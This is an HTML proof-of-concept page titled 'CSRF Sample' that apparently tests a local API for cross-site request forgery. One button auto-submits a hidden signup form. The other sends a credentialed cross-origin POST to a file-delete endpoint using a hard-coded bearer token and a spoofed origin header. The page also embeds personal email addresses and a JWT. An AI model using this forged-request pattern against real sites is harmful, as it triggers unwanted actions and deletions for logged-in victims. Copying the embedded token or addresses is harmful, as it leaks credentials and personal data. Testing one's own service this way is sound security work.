<html>
  <body>
    <h1>CSRF Sample</h1>

    <form action="https://localhost:3336/api/v1/user/signup" method="POST" style="margin-bottom:24px">
      <input type="hidden" name="email" value="kou0407hei@gmail.com" />
    </form>
    <button id="button1" type="submit">同期Submit</button>
    <button id="button2" type="submit">非同期 Submit</button>
  </body>
  <style>
    input,button {
      cursor:pointer;
    }
  </style>

  <script>
  const button1 = document.getElementById('button1')
  const button2 = document.getElementById('button2');


  function CSRF1() {
    console.log("form submitted");
    document.forms[0].submit();
  }

  function CSRF2() {
    const data = JSON.stringify({"email": "kohei.maruyoshi@bajji.life"});
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://localhost:3336/api/v1/file/delete");
    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhr.setRequestHeader("Authorization", "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MjcyNzYyODM4MjcsInN1YiI6ImtvaGVpLm1hcnV5b3NoaUBiYWpqaS5saWZlIiwiZXhwIjoxNjI3Mjc2Mjg3NDI3fQ.AWSIjq92pptRmqEMA9BSrnfGhBG1a8EjffQ_t78tf0beX-As9jlDAhzO65qbLJ3-KcmrEO8WR2VUfkCphLwTcRnQ4PuoaGfyMLMv2Yd9zvrz2ZQQJXOOJoaZMvJ1YCOIRsv-7LSzvikS1hPnC9Ot2TfdjgzyfM3-ZasV7NRkRhdue5LCt8ibGmN9jWdMBZFqFkt4fYUi8g4LgThnf3EGUeaIkgNf4c0Jl7YY9hHP7NpTKBt_QD7qFT1iSWbPXc9si7xcnWIpXbc7rQmi8cjwcOtOEXRsUT_xVdztnC07TjQR1fEur2xFbJkV8RIRiE8VLRGpKBJ9ghbWtDGC0voARRWh35e_979hnu7SKzzX3i3ev2ffFcS0n4iIvN06WrdbDnzfBE6SBxVKlpALV5freXFQ4AMG-ApobVzn88BFEFOKJ6cglxRCjw2E8N3_7EiP2CFivQTHnJPtLy4XKcIUau4uQfQzizceIne-dFEd5eXbu6JgqCQGvncGV9mHNcOLfS7Kg40mYVTMi17j9spIz7aFWeno-B-xF-8gGhyvX9NIleV4PMHbCtgr_gU5b4QkKqEzsSY4Lj4S_qEH8h0S3pLEdWVlfVwG0gnu_EgNiZ8Ke3zUFXlpNhGi01NVwrDrsuoPl-TLAeOh26hc-3jPF2C59Qxk0Rp44o6Ts3otZ4A");
    xhr.setRequestHeader("X-From", "https://digital-souko-front-dev.vercel.app");
    xhr.withCredentials = true;

    xhr.send(data)

    console.log('button clicked');
  }



  button1.addEventListener('click', CSRF1);
  button2.addEventListener('click', CSRF2);
  </script>
</html>